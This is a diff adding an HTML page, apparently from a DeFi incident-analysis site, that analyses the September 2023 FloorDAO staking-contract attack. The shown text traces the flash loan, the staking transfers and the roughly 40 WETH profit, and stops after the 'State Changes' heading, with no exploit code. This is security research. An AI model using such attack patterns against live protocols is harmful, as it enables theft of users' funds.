@@ -1,0 +1,1613 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://autosaida.github.io/DeFiHackAnalysis/2023/230905_FloorDAO/">
+      
+      
+        <link rel="prev" href="../230415_HundredFinance/">
+      
+      
+        <link rel="next" href="../230905_HeavensGate_JumpFarm_QuantumWN/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.41">
+    
+    
+      
+        <title>230905-FloorDAO - DeFiHackAnalysis</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Merriweather+Sans:300,300i,400,400i,700,700i%7CRed+Hat+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Merriweather Sans";--md-code-font:"Red Hat Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="https://unpkg.com/katex@0/dist/katex.min.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#230905-floordao" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="DeFiHackAnalysis" class="md-header__button md-logo" aria-label="DeFiHackAnalysis" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            DeFiHackAnalysis
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              230905-FloorDAO
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="deep-purple"  aria-label="Dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="deep-orange"  aria-label="Light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Autosaida/DeFiHackAnalysis" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="DeFiHackAnalysis" class="md-nav__button md-logo" aria-label="DeFiHackAnalysis" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    DeFiHackAnalysis
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Autosaida/DeFiHackAnalysis" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2022
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            2022
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2022/221025_ULME/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    221025-ULME
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2022/221129_MBC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    221129-MBC-ZZSH
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2023
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            2023
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230119_SHOCO/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230119-SHICO
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230126_TINU/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230126-TINU
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230415_HundredFinance/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230415-HundredFinance
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    230905-FloorDAO
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    230905-FloorDAO
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#attacktx" class="md-nav__link">
+    <span class="md-ellipsis">
+      AttackTx
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AttackTx">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fund-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fund Flow
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#balance-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Balance Changes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#state-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      State Changes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#invocation-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invocation Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vulnerability
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Vulnerability">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#floordao" class="md-nav__link">
+    <span class="md-ellipsis">
+      FloorDAO
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reason-for-profit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reason for Profit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reason for Profit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lagging-epoch" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lagging Epoch
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bug-in-stake-function" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bug in stake Function
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reproduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reproduction
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Misc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Misc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#frontrunning-protection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Frontrunning Protection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#patch" class="md-nav__link">
+    <span class="md-ellipsis">
+      Patch
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reference
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230905_HeavensGate_JumpFarm_QuantumWN/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230905-HeavensGate-JumpFarm-QuantumWN
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../231018_MicDao/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    231018-MicDao
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../231206_TIME/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    231206-TIME
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2024
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            2024
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2024/240415_ChaingeFinance/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    240415-ChaingeFinance
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#attacktx" class="md-nav__link">
+    <span class="md-ellipsis">
+      AttackTx
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AttackTx">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fund-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fund Flow
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#balance-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Balance Changes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#state-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      State Changes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#invocation-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invocation Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vulnerability
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Vulnerability">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#floordao" class="md-nav__link">
+    <span class="md-ellipsis">
+      FloorDAO
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reason-for-profit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reason for Profit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reason for Profit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lagging-epoch" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lagging Epoch
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bug-in-stake-function" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bug in stake Function
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reproduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reproduction
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Misc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Misc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#frontrunning-protection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Frontrunning Protection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#patch" class="md-nav__link">
+    <span class="md-ellipsis">
+      Patch
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reference
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="230905-floordao">230905-FloorDAO</h1>
+<h2 id="attacktx">AttackTx</h2>
+<p>Analyzing the <a href="https://explorer.phalcon.xyz/tx/eth/0x1274b32d4dfacd2703ad032e8bd669a83f012dde9d27ed92e4e7da0387adafe4">attack transaction</a> using Phalcon.</p>
+<h3 id="fund-flow">Fund Flow</h3>
+<p>The fund flow is not complex.</p>
+<p><img alt="Fund Flow" src="../../image/230905_FloorDAO.assets/4855.png" /></p>
+<p>The attacking contract withdrew approximately 150k Floor tokens from the Uniswap pool and later returned around 168k tokens. Additionally, it obtained 40 WETH. It appears that the attacker used the flash loan functionality of the pool to acquire the initial capital for the attack and then converted the profit earned in Floor tokens into WETH.</p>
+<p><img alt="Fund Flow" src="../../image/230905_FloorDAO.assets/5412.png" /></p>
+<p>Subsequently, the attacking contract transferred Floor tokens to the FloorStaking contract (2), while new Floor tokens were minted into the staking contract (3). This process involved minting and burning gFloor tokens (4, 5). In the end, the attacking contract obtained more Floor tokens than initially transferred to the staking contract (6). (There appears to be an issue in the flow here, as the amount transferred to the staking contract exceeded the originally borrowed Floor tokens.)</p>
+<p>Clearly, the attacker was able to profit from this attack, and the issue seems to be related to the FloorStaking contract.</p>
+<h3 id="balance-changes">Balance Changes</h3>
+<p><img alt="Balance Changes" src="../../image/230905_FloorDAO.assets/0153.png" /></p>
+<p>From the balance changes, it is evident that the attacker profited by approximately 16k Floor tokens, which were then exchanged for 40 WETH. These Floor tokens originated from the FloorStaking contract, and approximately 13k new Floor tokens were minted by the contract during the attack.</p>
+<h3 id="state-changes">State Changes</h3>
+<p><img alt="State Changes" src="../../image/230905_FloorDAO.assets/0518.png" /></p>
